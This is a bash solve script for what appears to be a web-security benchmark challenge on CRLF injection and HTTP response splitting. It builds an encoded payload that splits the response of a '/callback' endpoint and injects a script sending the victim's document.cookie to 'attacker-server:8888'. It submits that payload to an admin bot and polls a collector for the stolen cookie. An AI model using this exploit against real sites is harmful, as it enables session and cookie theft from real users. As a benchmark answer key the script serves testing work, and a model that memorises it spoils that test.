#!/usr/bin/env bash
# APEX-039-25 — "CRLF Injection for Response Splitting" (tags: crlf, header_injection)
#
# A value that reaches a response header without being checked for `\r\n` does
# not stay a value: the two bytes that separate one header from the next are
# ordinary characters in a query string. Past them the attacker is writing
# headers, and past a blank line, a body — so a reflected parameter becomes a
# whole response of the attacker's choosing, served from the application's own
# origin and therefore able to read its cookies.
#
# `/callback` is the endpoint to split, not `/redirect`: injected HTML in a 302
# is never rendered, because the browser follows the `Location` instead.
#
# The victim is the admin bot, and the flag is in the cookie it carries, so the
# payload has to send that cookie somewhere. That somewhere is the collector
# this benchmark ships.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
HOST="${URL%:*}"
APP="${APP_URL:-$HOST:3000}"
COLLECTOR="${COLLECTOR_URL:-$HOST:8888}"
SESSION="apex039-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

SPLIT="$(python3 -c '
import urllib.parse
script = ("<script>new Image().src="
          "\"http://attacker-server:8888/s.gif?c=\"+document.cookie</script>")
print(urllib.parse.quote(
    "x\r\nContent-Type: text/html\r\n\r\n" + script, safe=""))
')"

"$H5I" browser open "$APP/" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/report \
    --set header.Content-Type=application/json \
    --set "json.url=http://app:3000/callback?state=$SPLIT&code=ok" >/dev/null

# The bot visits on its own schedule, so read the collector until it has
# something rather than once and too early.
for _ in $(seq 1 20); do
    "$H5I" browser navigate "$COLLECTOR/stolen" --session "$SESSION" >/dev/null
    LATEST="$(last "$SESSION")"
    FOUND="$("$H5I" websec show "res_${LATEST#req_}" --session "$SESSION" --raw | flag)"
    [ "$FOUND" != "no flag found" ] && break
    sleep 2
done
printf '%s\n' "$FOUND"
